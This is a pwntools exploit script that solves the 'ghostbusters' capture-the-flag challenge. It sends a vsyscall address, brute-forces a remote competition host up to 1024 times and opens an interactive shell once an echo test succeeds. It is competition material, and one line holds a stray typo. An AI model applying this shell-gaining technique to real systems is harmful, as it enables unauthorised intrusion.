from pwn import *

e = ELF("./ghostbusters")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

for i in range(1024 if is_remote else 1):
  if is_remote:
    p = remote("chals.damctf.xyz", 32556)
  else:
    p = process(e.path)
    #, env={"LD_PRELOAD": libc.path})

  debug()

  p.sendlineafter("?", hex(0xffffffffff600400))

  try:
    p.sendline("echo 1sdf")
    p.recvuntil("1sdf")
  except EOFError:
    break;d

  p.interactive()
